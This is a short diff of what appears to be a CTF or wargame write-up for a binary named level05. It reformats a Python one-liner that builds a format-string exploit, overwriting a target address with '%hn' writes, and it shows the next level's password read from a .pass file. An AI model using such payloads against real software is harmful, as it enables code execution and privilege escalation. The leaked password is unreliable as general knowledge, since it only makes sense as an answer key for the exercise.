@@ -43,9 +43,9 @@ We want to put short value like this:
 `\x08\x04\x97\xe0`     <= `d80f` <= 55311
 
 
-python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55303c' + '%10\$hn' + '%10224c' + '%11\$hn'"> /tmp/exploit_5; cat /tmp/exploit_5 - | ./level05
+`python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55303c' + '%10\$hn' + '%10224c' + '%11\$hn'"> /tmp/exploit_5; cat /tmp/exploit_5 - | ./level05`
 
-```
+```s
 cat /home/users/level06/.pass
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
